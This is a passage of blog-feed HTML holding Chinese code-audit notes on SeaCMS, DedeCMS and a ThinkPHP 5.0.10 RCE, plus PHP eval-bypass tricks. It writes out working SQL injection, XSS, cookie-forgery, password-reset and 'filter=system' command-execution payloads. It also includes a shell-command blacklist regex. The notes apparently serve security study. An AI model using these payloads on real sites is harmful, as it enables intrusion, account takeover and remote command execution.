src="/../images/image-20221202195409112-1686141975684.png" alt="image-20221202195409112"></p><h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><p><img src="/../images/image-20221202191243192.png" alt="image-20221202120844185"></p><p><img src="/../images/image-20221202191403061.png" alt="image-20221202120844185"></p><p>文件路径只作了去除头尾空格的处理，存在目录穿越；文件内容实际上是调用了stripslashes，并没有过滤。</p><p>测试</p><p><img src="/../images/image-20221202194248639.png" alt="image-20221202120844185"></p><img src="E:\typora img\image-20221202194300861.png" alt="image-20221202194300861" style="zoom:80%;" /><h1 id="SeaCMS"><a href="#SeaCMS" class="headerlink" title="SeaCMS"></a>SeaCMS</h1><p>网站架构，无框架，目录结构如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">├─admin   <span class="comment"># 后台</span></span><br><span class="line">├─css  <span class="comment"># 存放css文件</span></span><br><span class="line">├─files  <span class="comment"># 存放页面</span></span><br><span class="line">├─images  <span class="comment"># 存放图片</span></span><br><span class="line">├─inc  <span class="comment"># 存放网站配置，校验，过滤文件</span></span><br><span class="line">├─install <span class="comment"># 网站安装</span></span><br><span class="line">├─seacmseditor <span class="comment"># 网站编辑器</span></span><br><span class="line">├─template <span class="comment"># 网站模板</span></span><br><span class="line">└─upload   <span class="comment"># 存放上传文件</span></span><br></pre></td></tr></table></figure><h2 id="查看入口文件"><a href="#查看入口文件" class="headerlink" title="查看入口文件"></a>查看入口文件</h2><p>所有的入口都是通过传递r参数来分发路由，对应files目录中的文件</p><p><img src="/../images/image-20230525134023397-1686141975684.png" alt="image-20230525134023397"></p><p><img src="/../images/image-20230525141822013-1686141975684.png" alt="image-20230525141822013"></p><p>这里只用<code>addslashes</code>进行了转义，明显路径穿越+文件包含</p><p><img src="/../images/image-20230525134741282-1686141975685.png" alt="image-20230525134741282"></p><p>其他思路</p><ul><li><p>如果是linux系统，也可以通过<code>pearcmd.php</code>来getshell</p><blockquote><p>在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装</p></blockquote></li><li><p>尝试%00截断路径，造成任意文件读取，不知道为啥失败了，环境：php5.3.29，<strong>magic_quotes_gpc</strong>&#x3D;OFF</p></li><li><p>如果php版本小于5.2.8，linux 需要文件名长于 4096，windows 需要长于 256，超过部分会被丢弃从而实现文件包含绕过后缀.php限制</p></li></ul><h2 id="查看配置文件"><a href="#查看配置文件" class="headerlink" title="查看配置文件"></a>查看配置文件</h2><p>通过install目录下的InstallLock.txt是否存在来判断是否安装，如果可以删除该文件，就可以配合入口文件的文件包含漏洞来重新安装网站。</p><p><img src="/../images/image-20230525135351792-1686141975685.png" alt="image-20230525135351792"></p><p>数据库编码为<code>utf-8</code>，不存在宽字节注入</p><p><img src="/../images/image-20230525135521039-1686141975685.png" alt="image-20230525135521039"></p><h2 id="查看身份校验文件"><a href="#查看身份校验文件" class="headerlink" title="查看身份校验文件"></a>查看身份校验文件</h2><p><img src="/../images/image-20230525140710113-1686141975685.png" alt="image-20230525140710113"></p><p>垂直越权，只要在cookie中加入user值</p><p><img src="/../images/image-20230525140957487-1686141975685.png" alt="image-20230525140957487"></p><h2 id="前台-1"><a href="#前台-1" class="headerlink" title="前台"></a>前台</h2><h3 id="about-php"><a href="#about-php" class="headerlink" title="about.php"></a><code>about.php</code></h3><p><img src="/../images/image-20230525141923350-1686141975685.png" alt="image-20230525141923350"></p><p>使用<code>addslashes</code>来过滤，逃逸不了引号，所以不存在sql注入</p><h3 id="concat-php"><a href="#concat-php" class="headerlink" title="concat.php"></a><code>concat.php</code></h3><p>sql都用了<code>addslashes</code>来过滤</p><p>但是存在xss</p><p><img src="/../images/image-20230525142829890-1686141975685.png" alt="image-20230525142829890"></p><p><img src="/../images/image-20230525142841766-1686141975685.png" alt="image-20230525142841766"></p><p><img src="/../images/image-20230525143133231-1686141975685.png" alt="image-20230525143133231"></p><p><img src="/../images/image-20230525143813133-1686141975685.png" alt="image-20230525143813133"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:name=<span class="string">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525144008677-1686141975686.png" alt="image-20230525144008677"></p><h3 id="content-php"><a href="#content-php" class="headerlink" title="content.php"></a><code>content.php</code></h3><p>存在数字型终于可以注入了，配合<code>mysql_error</code>进行报错注入</p><p><img src="/../images/image-20230525144109692-1686141975686.png" alt="image-20230525144109692"></p><p><img src="/../images/image-20230525144251129-1686141975686.png" alt="image-20230525144251129"></p><h3 id="submit-php"><a href="#submit-php" class="headerlink" title="submit.php"></a><code>submit.php</code></h3><p><img src="/../images/image-20230525145929543-1686141975686.png" alt="image-20230525145929543"></p><p><img src="/../images/image-20230525151458927-1686141975686.png" alt="image-20230525151458927"></p><p>因为验证码正确后也不刷新，所以可以使用同一个验证码进行注入</p><p><img src="/../images/image-20230525151429571-1686141975686.png" alt="image-20230525151429571"></p><p>存储xss</p><p>过滤</p><p><img src="/../images/image-20230525145800880-1686141975686.png" alt="image-20230525145800880"></p><p>但是还是可以在name处保存</p><p>输出点</p><p><img src="/../images/image-20230525145901519-1686141975686.png" alt="image-20230525145901519"></p><h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><h3 id="后台登录-1"><a href="#后台登录-1" class="headerlink" title="后台登录"></a>后台登录</h3><p><img src="/../images/image-20230525153016604-1686141975686.png" alt="image-20230525153016604"></p><p>没有过滤，可以使用联合查询构造临时用户数据登录,或者报错注入拿到密码后解密登录</p><p>判断字段数</p><p><img src="/../images/image-20230525153002742-1686141975686.png" alt="image-20230525153002742"></p><p>确定用户名，密码字段位置</p><p><img src="/../images/image-20230525154135880-1686141975687.png" alt="image-20230525154135880"></p><p>联合查询登陆</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user=-<span class="number">1</span><span class="string">&#x27;+union+select+1,2,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849b<span class="string">&#x27;,5,6,7,8#&amp;password=1&amp;login=yes</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525154322362-1686141975687.png" alt="image-20230525154322362"></p><h3 id="文件上传处"><a href="#文件上传处" class="headerlink" title="文件上传处"></a>文件上传处</h3><p><code>up.class.php</code></p><p>白名单，文件大小检测，文件时间戳重命名,图片裁剪生成缩略图</p><p>没啥用，需要配合其他漏洞</p><h1 id="DedeCMS"><a href="#DedeCMS" class="headerlink" title="DedeCMS"></a>DedeCMS</h1><p>进行功能点审计</p><h2 id="全局总览"><a href="#全局总览" class="headerlink" title="全局总览"></a>全局总览</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">入口文件主要有三个</span><br><span class="line">前台</span><br><span class="line">后台：dede/</span><br><span class="line">会员：member/</span><br></pre></td></tr></table></figure><p>全局函数<br>在项目根目录的index文件包含的&#x2F;include&#x2F;common.inc.php中<br>过滤的：</p><p>检查和注册外部提交的变量，<code>CheckRequest</code></p><p><img src="/../images/image-20230526102737909-1686141975687.png" alt="image-20230526102737909"></p><p>文件上传的</p><p><img src="/../images/image-20230526102806414-1686141975687.png" alt="image-20230526102806414"></p><p>分页参数的</p><p><img src="/../images/image-20230526102852980-1686141975687.png" alt="image-20230526102852980"></p><p>函数集</p><p><img src="/../images/image-20230526102920759-1686141975687.png" alt="image-20230526102920759"></p><p><code>include/filter.inc.php</code></p><p>过滤不文明内容的😅，不是为了防御漏洞的</p><h2 id="文件上传功能点"><a href="#文件上传功能点" class="headerlink" title="文件上传功能点"></a>文件上传功能点</h2><h3 id="dede-archives-do-php"><a href="#dede-archives-do-php" class="headerlink" title=" /dede/archives_do.php"></a><code> /dede/archives_do.php</code></h3><p><img src="/../images/image-20230525201745708-1686141975687.png" alt="image-20230525201745708"></p><p><img src="/../images/image-20230525200159854-1686141975687.png" alt="image-20230525200159854"></p><p>实际上是调用了<code>upload.helper.php</code>中的<code>AdminUpload</code>方法</p><p><img src="/../images/image-20230525201545164-1686141975687.png" alt="image-20230525201545164"></p><p><img src="/../images/image-20230525201700590-1686141975687.png" alt="image-20230525201700590"></p><p>可以看到只对文件的MIME类型进行了校验,没有对文件后缀进行校验</p><p>再看一下全局防护<code>uploadsafe.inc.php</code></p><p><img src="/../images/image-20230525201856657-1686141975688.png" alt="image-20230525201856657"></p><p><img src="/../images/image-20230525201949967-1686141975688.png" alt="image-20230525201949967"></p><p>虽然有黑名单，但是黑名单对管理员用户无效</p><p><img src="/../images/image-20230525202104709-1686141975688.png" alt="image-20230525202104709"></p><p>最后用<code>getimagesize</code>进行校验，可以添加文件头绕过。</p><p>综上所属，是管理员身份，只需要修改MIME和文件头即可绕过过滤。</p><p><img src="/../images/image-20230525191610086-1686141975688.png" alt="image-20230525191610086"></p><p><img src="/../images/image-20230525191553945-1686141975688.png" alt="image-20230525191553945"></p><h3 id="dede-media-add-php"><a href="#dede-media-add-php" class="headerlink" title="/dede/media_add.php"></a><code>/dede/media_add.php</code></h3><p><img src="/../images/image-20230525205532459-1686141975688.png" alt="image-20230525205532459"></p><p>跟上一个差不多，只校验MIME，不校验后缀，只是多了一步加水印的，所以传一个php后缀的图片马</p><p><img src="/../images/image-20230525205858924-1686141975688.png" alt="image-20230525205858924"></p><h3 id="dede-file-manage-control-php"><a href="#dede-file-manage-control-php" class="headerlink" title="/dede/file_manage_control.php"></a><code>/dede/file_manage_control.php</code></h3><p><img src="/../images/image-20230525204329712-1686141975689.png" alt="image-20230525204329712"></p><p><img src="/../images/image-20230525210840452-1686141975688.png" alt="image-20230525210840452"></p><p><img src="/../images/image-20230525211553932-1686141975689.png" alt="image-20230525211553932"></p><p>没有对内容进行过滤，这里可以写🐎</p><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><p><code>plus/download.php</code></p><p><img src="/../images/image-20230526100708534-1686141975688.png" alt="image-20230526100708534"></p><p><img src="/../images/image-20230526100724469-1686141975689.png" alt="image-20230526100724469"></p><p><img src="/../images/image-20230526101319599-1686141975690.png" alt="image-20230526101319599"></p><p><code>$linkinfo</code>压根不存在，没有过滤，对url先进行base64加密，再进行url加密即可</p><p><img src="/../images/image-20230526101138188-1686141975689.png" alt="image-20230526101138188"></p><h2 id="会员任意密码修改"><a href="#会员任意密码修改" class="headerlink" title="会员任意密码修改"></a>会员任意密码修改</h2><p>先看一下会员中心的逻辑</p><p><code>member/index.php</code></p><p>校验用户是否登录，登录则进入会员个人中心</p><p><code>member/index_do.php</code></p><p>会员操作与<code>$fmdo</code>参数匹配</p><p>重置密码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index_do.php?fmdo=user&amp;dopost=xxx</span><br></pre></td></tr></table></figure><p>重置密码逻辑在<code>resetpassword.php</code>中,大致逻辑如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword.htm&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpwd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 找回密码第一步</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 密码问题判断</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpasswd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 找回密码第二步</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注密码问题判断</p><p><img src="/../images/image-20230526123219865-1686141975689.png" alt="image-20230526123219865"></p><p>使用了弱比较，如果用户没有设置密码问题，默认值如下</p><p><img src="/../images/image-20230526123041472-1686141975689.png" alt="image-20230526123041472"></p><p>所以可以构造<code>safequestion=0.0&amp;safeanswer=</code>来进入该if语句</p><p>跟进 sn，最终是重定向到修改密码页面</p><p><img src="/../images/image-20230526123510601-1686141975689.png" alt="image-20230526123510601"></p><h2 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h2><p>看一下怎么处理的</p><p><code>member/config.php</code></p><p><img src="/../images/image-20230526130641724-1686141975689.png" alt="image-20230526130641724"></p><p>跟进</p><p><img src="/../images/image-20230526130848007-1686141975689.png" alt="image-20230526130848007"></p><p><img src="/../images/image-20230526132740089-1686141975689.png" alt="image-20230526132740089"></p><p>对得到的<code>M_ID</code>做了<code>intval</code>处理，最后根据<code>M_ID</code>的值从数据库中取出对应用户</p><p>跟进<code>getnum</code></p><p><img src="/../images/image-20230526132102568-1686141975689.png" alt="image-20230526132102568"></p><p>跟进<code>getcookie</code></p><p><img src="/../images/image-20230526131125230-1686141975689.png" alt="image-20230526131125230"></p><p>两个IF，第一个if判断Cookie中的DedeUserID和DedeUserID__ckMD5,如果都存在进入第二个if，校验cookie有效性，可以看到是通过加盐再加密的方式，所以按理说是无法伪造cookie的。</p><p>但是可以从<code>/member/index.php</code>可以来获取这个加密后的值</p><p>搜索<code>getcookie</code>得到</p><p><img src="/../images/image-20230526131657609-1686141975689.png" alt="image-20230526131657609"></p><p>跟踪<code>$last_vid</code></p><p><img src="/../images/image-20230526132259147-1686141975690.png" alt="image-20230526132259147"></p><p>如果<code>$last_vid</code>为空，那么将<code>$uid</code>赋值给<code>$last_vid</code>，并作为参数传递给<code>PutCookie</code>函数</p><p>跟进<code>PutCookie</code>函数</p><p><img src="/../images/image-20230526132158862-1686141975690.png" alt="image-20230526132158862"></p><p>可以看到跟登录的<code>getcookie</code>加密方式一样。</p><p>总结一下：</p><p>登录</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">用户的身份由DedeUserID的值来决定</span><br><span class="line"></span><br><span class="line">校验：DedeUserID__ckMd5的值和<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.DedeUserID)</span><br></pre></td></tr></table></figure><p>访问<code>member/index.php?uid=xx</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">last_vid=uid</span><br><span class="line"></span><br><span class="line">last_vid__ckMd5=<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.uid)</span><br></pre></td></tr></table></figure><p>所以让</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p>就可以绕过getcookie的校验，但是还有一个问题是<code>uid</code>指的是用户的<code>userid</code>，<code>DedeUserID</code>指的是用户的<code>mid</code>，所以要让<code>uid</code>为<code>mid</code>才可以伪造身份</p><p><img src="/../images/image-20230526134001725-1686141975691.png" alt="image-20230526134001725"></p><p>还记得上面的处理吗？</p><p><img src="/../images/image-20230526134147020-1686141975690.png" alt="image-20230526134147020"></p><p>所以只需要构造一个含有数字1的字符串就可以伪造admin的身份。</p><p>注册一个用户名为1admin的用户</p><p><img src="/../images/image-20230526125711799-1686141975690.png" alt="image-20230526125711799"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230526125702071-1686141975690.png" alt="image-20230526125702071"></p><h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer create<span class="literal">-project</span> <span class="literal">--prefer-dist</span> topthink/think=<span class="number">5.0</span>.<span class="number">10</span> tp5.<span class="number">0.10</span></span><br></pre></td></tr></table></figure><p>将 <a href="https://so.csdn.net/so/search?q=composer&spm=1001.2101.3001.7020">composer</a>.json 文件的 require 字段设置成如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;php&quot;</span>: <span class="string">&quot;&gt;=5.4.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;topthink/framework&quot;</span>: <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更新</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><p>将其放置到网站目录下，访问<a href="http://127.0.0.1/tp5.0.10/public/">http://127.0.0.1/tp5.0.10/public/</a></p><p><img src="/../images/image-20230529155309821-1686141975690.png" alt="image-20230529155309821"></p><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>推荐阅读<a href="https://www.cnblogs.com/yokan/p/16102644.html">https://www.cnblogs.com/yokan/p/16102644.html</a></p><h3 id="路由和参数传递"><a href="#路由和参数传递" class="headerlink" title="路由和参数传递"></a>路由和参数传递</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//servername/index.php/模块/控制器/操作/[参数名/参数值...] # pathinfo模式</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//servername/index.php?s=/index/Index/index    # 兼容方式</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?name=<span class="number">213</span></span><br><span class="line">/name/<span class="number">123</span></span><br></pre></td></tr></table></figure><p>如控制器Index：<code>application/index/controller/Index.php</code></p><p><img src="/../images/image-20230531232416306.png" alt="image-20230531232416306"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello?name=world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello/name/world</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello/name/world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello&amp;name=world</span></span><br></pre></td></tr></table></figure><h2 id="Request类任意调用-construct方法导致的rce"><a href="#Request类任意调用-construct方法导致的rce" class="headerlink" title="Request类任意调用__construct方法导致的rce"></a>Request类任意调用__construct方法导致的rce</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Request核心类**$method** 来自可控的 <strong>$_POST</strong> 数组，而且在获取之后没有进行任何检查，直接把它作为 <strong>Request</strong> 类的方法进行调用，同时，该方法传入的参数是可控数据 <strong>$_POST</strong> 。导致可以随意调用 <strong>Request</strong> 类的部分方法</p><blockquote><p><strong>过程：</strong></p><p>让method等于 <code>__construct</code>魔术方法，然后里面的 <code>foreach</code>函数造成变量覆盖。然后通过<strong>Request</strong> 类中的 <code>param</code>方法最终又调用了<code>filterValue</code>方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数，从而执行任意命令</p></blockquote><blockquote><p><strong>Request</strong> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <strong>filterValue</strong> 方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数</p></blockquote><p>以5.0.10版本为例</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/tp5.0.10/public/index.php</span><br><span class="line"></span><br><span class="line"># post</span><br><span class="line">_method=__construct&amp;filter=system&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531225820851.png" alt="image-20230531225820851"></p><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>第一个断点下在<code>thinkphp/libary/think/App.php</code>文件，调用<code>routeCheck</code>进行调度解析这里</p><p><img src="/../images/image-20230531221156861.png" alt="image-20230531221156861"></p><p>跟进<code>routeCheck</code></p><p><img src="/../images/image-20230531221218359.png" alt="image-20230531221218359"></p><p>跟进<code>check</code></p><p><img src="/../images/image-20230531221233596.png" alt="image-20230531221233596"></p><p>跟进<code>method</code></p><p><img src="/../images/image-20230531221259178.png" alt="image-20230531221259178"></p><p><code>var_method</code>在<code>application/config.php</code>中</p><p><img src="/../images/image-20230531222320838.png" alt="image-20230531222320838"></p><p>所以这里可以控制<code>method</code>变量，从而任意调用Request类的方法。</p><p>如果调用<code>__construct</code>方法</p><p><img src="/../images/image-20230531221707200.png" alt="image-20230531221707200"></p><p>存在一个<code>foreach</code>循环，如果传入的<code>options</code>数组的键名为该类的属性，就用键值覆盖该属性的值。</p><p><img src="/../images/image-20230531222852250.png" alt="image-20230531222852250"></p><p>继续往下</p><p>在<code>App::run()</code>方法里面，如果我们开启了debug模式，则会调用<code>Request::param()</code>方法：</p><p><img src="/../images/image-20230531223011915.png" alt="image-20230531223011915"></p><p>就算没有开启debug模式，下面的exec方法也会调用</p><p><img src="/../images/image-20230531230604547.png" alt="image-20230531230604547"></p><p><img src="/../images/image-20230531220640414.png" alt="image-20230531220640414"></p><p>跟进<code>Request::param()</code>方法</p><p>将获取到的post参数用<code>array_merge</code>与get方式的参数进行合并</p><p><img src="/../images/image-20230531225110758.png" alt="image-20230531225110758"></p><p>最后将其传入<code>input</code>中</p><p><img src="/../images/image-20230531224212939.png" alt="image-20230531224212939"></p><p>跟进<code>Request::input()</code>,<code>array_walk_recursive</code>  对数组中的每个成员递归地应用用户函数</p><p><img src="/../images/image-20230531224435122.png" alt="image-20230531224435122"></p><p>然后<code>filterValue</code>方法中，调用了<code>call_user_func</code>造成任意命令执行</p><p><img src="/../images/image-20230531223158698.png" alt="image-20230531223158698"></p><h3 id="关键点总结"><a href="#关键点总结" class="headerlink" title="关键点总结"></a>关键点总结</h3><p>From：七月火师傅的一张流程图</p><p><img src="/../images/1964477-20220405155310200-1040131440.png" alt="img"></p><h3 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h3><p>流程大同小异</p><p>payload总结：<a href="https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce">https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码执行绕过</title>
      <link href="/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/"/>
      <url>/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="绕过长度"><a href="#绕过长度" class="headerlink" title="绕过长度"></a>绕过长度</h2><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="variable">$get</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$get</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;This is too long.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$get</span>);</span><br><span class="line">          &#125; </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>命令执行绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;&amp;<span class="number">1</span>=bash</span><br></pre></td></tr></table></figure></li><li><p>远程文件包含</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];</span><br></pre></td></tr></table></figure></li><li><p>本地文件包含</p><ul><li>file_put_contents</li><li>日志文件包含</li></ul></li><li><p>利用变长参数特性展开数组–<strong>php 5.6</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>);&amp;<span class="number">2</span>=assert</span><br><span class="line">POST:param=<span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure></li></ul><h2 id="绕过前置混淆字符"><a href="#绕过前置混淆字符" class="headerlink" title="绕过前置混淆字符"></a>绕过前置混淆字符</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">str = 任意字符串</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>闭合php标签</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> payload; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>换行绕过</p><ul><li>%0a</li><li>\n</li><li>\r</li></ul></li></ol><h2 id="绕过字符种类数量"><a href="#绕过字符种类数量" class="headerlink" title="绕过字符种类数量"></a>绕过字符种类数量</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>] </span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># to be deleted</span></span><br><span class="line">temp = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        temp.add(<span class="built_in">hex</span>(d))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp), temp)</span><br></pre></td></tr></table></figure><blockquote><p>result2中的字符用result中的字符代替，d&#x3D;a^b^c^d,这样就减少了一种字符种类</p></blockquote><h2 id="爆破可用字符-x2F-可用函数"><a href="#爆破可用字符-x2F-可用函数" class="headerlink" title="爆破可用字符&#x2F;可用函数"></a>爆破可用字符&#x2F;可用函数</h2><blockquote><p>在浏览器中查看结果</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$preg</span> =<span class="string">&#x27;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&#x27;</span>;</span><br><span class="line">可用字符</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span>=<span class="number">0</span>;<span class="variable">$a</span>&lt;<span class="number">128</span>;<span class="variable">$a</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span 